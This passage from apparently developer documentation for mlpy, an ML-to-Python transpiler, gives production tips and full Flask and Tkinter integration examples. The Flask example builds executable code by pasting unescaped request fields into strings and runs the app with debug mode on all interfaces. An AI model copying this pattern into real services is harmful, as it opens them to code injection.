    ml_files = ["validation.ml", "calculation.ml", "reporting.ml"]

    for ml_file in ml_files:
        # Transpile and cache at deployment time
        transpile_ml_file(
            ml_file,
            strict_security=True,
            generate_source_maps=True
        )
        # Creates .py and .py.map files for instant loading

    # 2. Reuse transpiler instance
    transpiler = MLTranspiler()  # Create once
    # Use same instance for all transpilations (thread-safe)

    # 3. REPL session pooling
    from queue import Queue

    repl_pool = Queue(maxsize=10)
    for _ in range(10):
        session = MLREPLSession(security_enabled=True)
        # Pre-load common ML code
        session.execute_ml_line("import math; import json;")
        repl_pool.put(session)

    def execute_with_pool(ml_code: str):
        session = repl_pool.get()
        try:
            result = session.execute_ml_line(ml_code)
            return result
        finally:
            repl_pool.put(session)

    # 4. Capability token caching
    capability_cache = {}

    def get_cached_token(cap_type: str, resources: tuple):
        cache_key = (cap_type, resources)
        if cache_key not in capability_cache:
            capability_cache[cache_key] = create_capability_token(
                capability_type=cap_type,
                resource_patterns=list(resources)
            )
        return capability_cache[cache_key]
```

### 9.2 Error Handling Best Practices

```python
def production_error_handling():
    """Error handling for production ML integration."""

    from mlpy.ml.transpiler import execute_ml_code_sandbox
    from mlpy.runtime.sandbox import SandboxConfig, SandboxTimeoutError
    import logging

    logger = logging.getLogger("ml_integration")

    def execute_ml_safely(ml_code: str, context: dict):
        """Execute ML with comprehensive error handling."""

        try:
            config = SandboxConfig(
                memory_limit="100MB",
                cpu_timeout=30.0,
                strict_mode=True
            )

            result, issues = execute_ml_code_sandbox(
                ml_code,
                sandbox_config=config,
                strict_security=True
            )

            # Log security issues
            if issues:
                logger.warning(
                    f"ML security issues: {len(issues)}",
                    extra={"ml_code": ml_code, "issues": [str(i) for i in issues]}
                )

            if result.success:
                return {
                    "success": True,
                    "value": result.return_value,
                    "execution_time": result.execution_time,
                    "memory_used": result.memory_usage
                }
            else:
                logger.error(
                    f"ML execution failed: {result.error}",
                    extra={"ml_code": ml_code, "error": str(result.error)}
                )
                return {
                    "success": False,
                    "error": "Execution failed",
                    "details": str(result.error)
                }

        except SandboxTimeoutError as e:
            logger.error(f"ML execution timeout: {e}")
            return {
                "success": False,
                "error": "timeout",
                "message": "ML code execution exceeded time limit"
            }

        except Exception as e:
            logger.exception(f"Unexpected ML error: {e}")
            return {
                "success": False,
                "error": "internal_error",
                "message": "Internal system error"
            }
```

### 9.3 Monitoring and Metrics

```python
def production_monitoring():
    """Monitor ML integration in production."""

    import time
    from collections import defaultdict

    # Metrics collection
    metrics = {
        "executions": 0,
        "successes": 0,
        "failures": 0,
        "timeouts": 0,
        "security_violations": 0,
        "total_execution_time": 0.0,
        "total_memory_used": 0,
        "execution_times": []  # For percentile calculations
    }

    def record_execution(result, issues):
        """Record metrics for ML execution."""
        metrics["executions"] += 1

        if result.success:
            metrics["successes"] += 1
        else:
            metrics["failures"] += 1
            if "timeout" in str(result.error):
                metrics["timeouts"] += 1

        if issues:
            metrics["security_violations"] += len(issues)

        metrics["total_execution_time"] += result.execution_time
        metrics["total_memory_used"] += result.memory_usage
        metrics["execution_times"].append(result.execution_time)

    def get_metrics_report():
        """Generate metrics report."""
        if metrics["executions"] == 0:
            return "No executions yet"

        exec_times = sorted(metrics["execution_times"])
        p50 = exec_times[len(exec_times) // 2]
        p95 = exec_times[int(len(exec_times) * 0.95)]
        p99 = exec_times[int(len(exec_times) * 0.99)]

        return {
            "total_executions": metrics["executions"],
            "success_rate": metrics["successes"] / metrics["executions"],
            "failure_rate": metrics["failures"] / metrics["executions"],
            "timeout_rate": metrics["timeouts"] / metrics["executions"],
            "security_violations": metrics["security_violations"],
            "avg_execution_time": metrics["total_execution_time"] / metrics["executions"],
            "p50_execution_time": p50,
            "p95_execution_time": p95,
            "p99_execution_time": p99,
            "avg_memory_used": metrics["total_memory_used"] / metrics["executions"]
        }
```

---

## 10. Complete Integration Examples

### 10.1 Flask Web Application with ML Business Logic

```python
# app.py - Complete Flask integration example

from flask import Flask, request, jsonify, render_template
from mlpy.cli.repl import MLREPLSession
from mlpy.runtime.capabilities.manager import get_capability_manager
from mlpy.runtime.capabilities.tokens import create_capability_token
import logging

app = Flask(__name__)
logger = logging.getLogger(__name__)

# Initialize ML session for business logic
ml_session = MLREPLSession(security_enabled=True)

# Grant database read capability
manager = get_capability_manager()
db_token = create_capability_token(
    capability_type="database",
    resource_patterns=["users", "orders", "products"],
    allowed_operations={"read"}
)
ml_session.grant_capability("database.read")

# Load ML business logic
business_logic = '''
    import db;
    import math;

    // Order validation logic
    function validate_order(order) {
        errors = [];

        // Check required fields
        if (!order.customer_id) {
            errors.push("Missing customer ID");
        }
        if (!order.items || order.items.length == 0) {
            errors.push("Order must have at least one item");
        }

        // Validate items
        total = 0;
        for (i = 0; i < order.items.length; i = i + 1) {
            item = order.items[i];

            if (item.quantity <= 0) {
                errors.push("Invalid quantity for item " + item.product_id);
            }

            if (item.price < 0) {
                errors.push("Invalid price for item " + item.product_id);
            }

            total = total + item.price * item.quantity;
        }

        return {
            valid: errors.length == 0,
            errors: errors,
            total: total
        };
    }

    // Discount calculation logic
    function calculate_discount(total, customer_tier, promo_code) {
        base_discount = 0;

        // Tier-based discount
        if (customer_tier == "gold") {
            base_discount = 0.15;
        } elif (customer_tier == "silver") {
            base_discount = 0.10;
        } elif (customer_tier == "bronze") {
            base_discount = 0.05;
        }

        // Promo code discount
        promo_discount = 0;
        if (promo_code == "SAVE20") {
            promo_discount = 0.20;
        } elif (promo_code == "SAVE10") {
            promo_discount = 0.10;
        }

        // Take best discount
        final_discount = math.max(base_discount, promo_discount);
        discount_amount = total * final_discount;
        final_total = total - discount_amount;

        return {
            original_total: total,
            discount_rate: final_discount,
            discount_amount: discount_amount,
            final_total: final_total
        };
    }

    // Shipping calculation
    function calculate_shipping(address, weight_kg, total) {
        base_rate = 5.0;
        per_kg_rate = 2.0;

        // Free shipping over $100
        if (total >= 100) {
            return 0;
        }

        // International shipping
        if (address.country != "US") {
            base_rate = base_rate * 2;
            per_kg_rate = per_kg_rate * 1.5;
        }

        shipping_cost = base_rate + weight_kg * per_kg_rate;
        return math.round(shipping_cost * 100) / 100;  // Round to 2 decimals
    }
'''

result = ml_session.execute_ml_line(business_logic)
if not result.success:
    logger.error(f"Failed to load ML business logic: {result.error}")
    raise RuntimeError("ML initialization failed")

logger.info("ML business logic loaded successfully")


@app.route('/')
def index():
    """Serve homepage."""
    return render_template('index.html')


@app.route('/api/validate_order', methods=['POST'])
def api_validate_order():
    """Validate order using ML logic."""
    try:
        order_data = request.json

        # Call ML validation function
        import json
        ml_code = f"validate_order({json.dumps(order_data)});"

        result = ml_session.execute_ml_line(ml_code)

        if result.success:
            validation = result.value
            return jsonify(validation), 200 if validation["valid"] else 400
        else:
            logger.error(f"ML validation error: {result.error}")
            return jsonify({"error": "Validation failed"}), 500

    except Exception as e:
        logger.exception(f"API error: {e}")
        return jsonify({"error": "Internal server error"}), 500


@app.route('/api/calculate_price', methods=['POST'])
def api_calculate_price():
    """Calculate final price with discounts and shipping."""
    try:
        data = request.json
        order_total = data["order_total"]
        customer_tier = data.get("customer_tier", "bronze")
        promo_code = data.get("promo_code", "")
        address = data["address"]
        weight_kg = data["weight_kg"]

        # Calculate discount
        import json
        discount_code = f'''
            calculate_discount({order_total}, "{customer_tier}", "{promo_code}");
        '''

        discount_result = ml_session.execute_ml_line(discount_code)

        if not discount_result.success:
            return jsonify({"error": "Discount calculation failed"}), 500

        discount_info = discount_result.value
        final_total = discount_info["final_total"]

        # Calculate shipping
        shipping_code = f'''
            calculate_shipping({json.dumps(address)}, {weight_kg}, {final_total});
        '''

        shipping_result = ml_session.execute_ml_line(shipping_code)

        if not shipping_result.success:
            return jsonify({"error": "Shipping calculation failed"}), 500

        shipping_cost = shipping_result.value
        grand_total = final_total + shipping_cost

        return jsonify({
            "order_total": order_total,
            "discount": {
                "rate": discount_info["discount_rate"],
                "amount": discount_info["discount_amount"]
            },
            "subtotal": final_total,
            "shipping": shipping_cost,
            "grand_total": grand_total
        })

    except Exception as e:
        logger.exception(f"Price calculation error: {e}")
        return jsonify({"error": "Internal server error"}), 500


if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
```

### 10.2 Tkinter Desktop Application with ML Logic

```python
# desktop_app.py - Complete Tkinter integration example

import tkinter as tk
from tkinter import ttk, messagebox
from mlpy.cli.repl import MLREPLSession
import json

class MLCalculatorApp:
    """Desktop calculator using ML for complex calculations."""

    def __init__(self, root):
        self.root = root
        self.root.title("ML Calculator")
        self.root.geometry("600x500")

        # Initialize ML session
        self.ml_session = MLREPLSession(security_enabled=False)

        # Load ML calculation logic
        self.load_ml_logic()

        # Create UI
        self.create_widgets()

    def load_ml_logic(self):
        """Load ML calculation functions."""
        ml_code = '''
            import math;

            // Calculator state
            state = {
                history: []
            };

            // Basic operations
            function calculate(a, b, operation) {
                result = 0;

                if (operation == "add") {
                    result = a + b;
                } elif (operation == "subtract") {
                    result = a - b;
                } elif (operation == "multiply") {
                    result = a * b;
                } elif (operation == "divide") {
                    if (b == 0) {
                        return { error: "Division by zero" };
                    }
                    result = a / b;
                } elif (operation == "power") {
                    result = math.pow(a, b);
                } elif (operation == "modulo") {
                    if (b == 0) {
                        return { error: "Modulo by zero" };
                    }
                    result = a % b;
                }

                // Add to history
                entry = {
                    a: a,
                    b: b,
                    operation: operation,
                    result: result,
                    timestamp: typeof(Date) != "undefined" ? Date.now() : 0
                };
                state.history.push(entry);

                return { result: result };
            }

            // Scientific functions
            function scientific(value, function_name) {
                result = 0;

                if (function_name == "sqrt") {
                    if (value < 0) {
                        return { error: "Square root of negative number" };
                    }
                    result = math.sqrt(value);
                } elif (function_name == "sin") {
                    result = math.sin(value);
                } elif (function_name == "cos") {
                    result = math.cos(value);
                } elif (function_name == "tan") {
                    result = math.tan(value);
                } elif (function_name == "log") {
                    if (value <= 0) {
                        return { error: "Logarithm of non-positive number" };
                    }
                    result = math.log(value);
                } elif (function_name == "log10") {
                    if (value <= 0) {
                        return { error: "Logarithm of non-positive number" };
                    }
                    result = math.log10(value);
                } elif (function_name == "abs") {
                    result = math.abs(value);
                } elif (function_name == "factorial") {
                    if (value < 0 || value != math.floor(value)) {
                        return { error: "Factorial requires non-negative integer" };
                    }
                    result = 1;
                    for (i = 2; i <= value; i = i + 1) {
                        result = result * i;
                    }
                }

                return { result: result };
            }

            // Get calculation history
            function get_history() {
                return state.history;
            }

            // Clear history
            function clear_history() {
                state.history = [];
                return { success: true };
            }
        '''

        result = self.ml_session.execute_ml_line(ml_code)
        if not result.success:
            messagebox.showerror("Initialization Error",
                               f"Failed to load ML logic: {result.error}")
            self.root.destroy()

    def create_widgets(self):
        """Create UI widgets."""
        # Main frame
        main_frame = ttk.Frame(self.root, padding="10")
        main_frame.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))

        # Basic calculator section
        basic_frame = ttk.LabelFrame(main_frame, text="Basic Operations", padding="10")
        basic_frame.grid(row=0, column=0, sticky=(tk.W, tk.E), pady=5)

        ttk.Label(basic_frame, text="Value A:").grid(row=0, column=0, sticky=tk.W)
        self.value_a = tk.StringVar(value="0")
        ttk.Entry(basic_frame, textvariable=self.value_a, width=15).grid(row=0, column=1, padx=5)

        ttk.Label(basic_frame, text="Value B:").grid(row=1, column=0, sticky=tk.W)
        self.value_b = tk.StringVar(value="0")
        ttk.Entry(basic_frame, textvariable=self.value_b, width=15).grid(row=1, column=1, padx=5)

        ttk.Label(basic_frame, text="Operation:").grid(row=2, column=0, sticky=tk.W)
        self.operation = tk.StringVar(value="add")
        operations = ["add", "subtract", "multiply", "divide", "power", "modulo"]
        ttk.Combobox(basic_frame, textvariable=self.operation,
                    values=operations, width=13).grid(row=2, column=1, padx=5)

        ttk.Button(basic_frame, text="Calculate",
                  command=self.calculate_basic).grid(row=3, column=0, columnspan=2, pady=5)

        # Scientific calculator section
        sci_frame = ttk.LabelFrame(main_frame, text="Scientific Functions", padding="10")
        sci_frame.grid(row=1, column=0, sticky=(tk.W, tk.E), pady=5)

        ttk.Label(sci_frame, text="Value:").grid(row=0, column=0, sticky=tk.W)
        self.sci_value = tk.StringVar(value="0")
        ttk.Entry(sci_frame, textvariable=self.sci_value, width=15).grid(row=0, column=1, padx=5)

        ttk.Label(sci_frame, text="Function:").grid(row=1, column=0, sticky=tk.W)
        self.sci_function = tk.StringVar(value="sqrt")
        functions = ["sqrt", "sin", "cos", "tan", "log", "log10", "abs", "factorial"]
        ttk.Combobox(sci_frame, textvariable=self.sci_function,
                    values=functions, width=13).grid(row=1, column=1, padx=5)

        ttk.Button(sci_frame, text="Calculate",
                  command=self.calculate_scientific).grid(row=2, column=0, columnspan=2, pady=5)

        # Result display
        result_frame = ttk.LabelFrame(main_frame, text="Result", padding="10")
        result_frame.grid(row=2, column=0, sticky=(tk.W, tk.E), pady=5)

        self.result_var = tk.StringVar(value="0")
        result_label = ttk.Label(result_frame, textvariable=self.result_var,
                                font=("Arial", 16, "bold"))
        result_label.grid(row=0, column=0, sticky=(tk.W, tk.E))

        # History section
        history_frame = ttk.LabelFrame(main_frame, text="History", padding="10")
        history_frame.grid(row=3, column=0, sticky=(tk.W, tk.E, tk.N, tk.S), pady=5)

        self.history_text = tk.Text(history_frame, height=10, width=50)
        self.history_text.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))

        scrollbar = ttk.Scrollbar(history_frame, orient=tk.VERTICAL,
                                 command=self.history_text.yview)
        scrollbar.grid(row=0, column=1, sticky=(tk.N, tk.S))
        self.history_text.config(yscrollcommand=scrollbar.set)

        ttk.Button(history_frame, text="Clear History",
                  command=self.clear_history).grid(row=1, column=0, pady=5)

        # Configure grid weights
        self.root.columnconfigure(0, weight=1)
        self.root.rowconfigure(0, weight=1)
        main_frame.columnconfigure(0, weight=1)
        main_frame.rowconfigure(3, weight=1)
        history_frame.columnconfigure(0, weight=1)
        history_frame.rowconfigure(0, weight=1)

    def calculate_basic(self):
        """Perform basic calculation using ML."""
        try:
            a = float(self.value_a.get())
            b = float(self.value_b.get())
            op = self.operation.get()

            # Call ML function
            ml_code = f'calculate({a}, {b}, "{op}");'
            result = self.ml_session.execute_ml_line(ml_code)

            if result.success and result.value:
                if "error" in result.value:
                    messagebox.showerror("Calculation Error", result.value["error"])
                else:
                    calc_result = result.value["result"]
                    self.result_var.set(f"{calc_result:.6f}")
                    self.update_history()
            else:
                messagebox.showerror("Error", f"Calculation failed: {result.error}")

        except ValueError:
            messagebox.showerror("Input Error", "Please enter valid numbers")

    def calculate_scientific(self):
        """Perform scientific calculation using ML."""
        try:
            value = float(self.sci_value.get())
            func = self.sci_function.get()

            # Call ML function
            ml_code = f'scientific({value}, "{func}");'
            result = self.ml_session.execute_ml_line(ml_code)

            if result.success and result.value:
                if "error" in result.value:
                    messagebox.showerror("Calculation Error", result.value["error"])
                else:
                    calc_result = result.value["result"]
                    self.result_var.set(f"{calc_result:.6f}")
            else:
                messagebox.showerror("Error", f"Calculation failed: {result.error}")

        except ValueError:
            messagebox.showerror("Input Error", "Please enter a valid number")

    def update_history(self):
        """Update history display from ML state."""
        result = self.ml_session.execute_ml_line("get_history();")

        if result.success and result.value:
            history = result.value

            self.history_text.delete(1.0, tk.END)
            for entry in history:
                line = f"{entry['a']} {entry['operation']} {entry['b']} = {entry['result']}\n"
                self.history_text.insert(tk.END, line)

    def clear_history(self):
        """Clear calculation history."""
        result = self.ml_session.execute_ml_line("clear_history();")

        if result.success:
            self.history_text.delete(1.0, tk.END)


def main():
    """Run the ML calculator application."""
    root = tk.Tk()
    app = MLCalculatorApp(root)
    root.mainloop()


if __name__ == '__main__':
    main()
```

---

## Summary

### What WORKS Today

1. ✅ **Transpilation API** - Full ML→Python conversion with security analysis
2. ✅ **Sandbox Execution** - Process isolation with resource limits and capabilities
3. ✅ **REPL Integration** - Persistent ML environment for interactive execution
4. ✅ **Standard Library Bridge** - Decorator-based Python-ML module system
5. ✅ **Source Maps** - Debugging support with ML↔Python line mapping
6. ✅ **Capability System** - Fine-grained access control for ML code
7. ✅ **Error Reporting** - Rich error formatting with suggestions

### What's MISSING

1. ❌ **Auto-Export Decorator** - Simplified Python function exposure
2. ❌ **ML-as-Callback** - Direct ML function references in Python
3. ❌ **Async Execution** - Non-blocking ML execution
4. ❌ **GUI Framework** - Native widget control from ML
5. ❌ **Type Bridge** - Shared type information between languages
6. ❌ **Hot Reload** - Live ML script reloading
7. ❌ **Plugin System** - Formal ML-based plugin architecture

### Integration Patterns Available

- **Direct exec()** - Fast, same-process execution
- **Sandbox** - Isolated, resource-limited execution
- **REPL** - Persistent, stateful execution
- **Bridge Modules** - Structured Python-ML API exposure

### Recommended Approach

**For Production Systems:**
1. Use **Sandbox Execution** for untrusted ML code
2. Use **Bridge Modules** for exposing Python APIs
3. Use **REPL Sessions** for stateful applications
4. Implement **Capability-Based Security** for all integrations
5. Add **Monitoring and Metrics** for production observability

**For Development/Prototyping:**
1. Use **Direct exec()** with transpiler for speed
2. Use **Namespace Injection** for quick API exposure
3. Use **REPL** for interactive development

---

## Next Steps

1. **Implement Priority 1 Features** (Auto-export, ML-callbacks, Async)
2. **Expand Examples** (Add more real-world integration patterns)
3. **Create Integration Templates** (Flask, FastAPI, Tkinter, Qt)
4. **Write Migration Guide** (From prototype to production integration)
5. **Build Plugin Ecosystem** (Community-contributed ML modules)

---

**Document End**

For questions or contributions, see the mlpy GitHub repository:
https://github.com/anthropics/mlpy
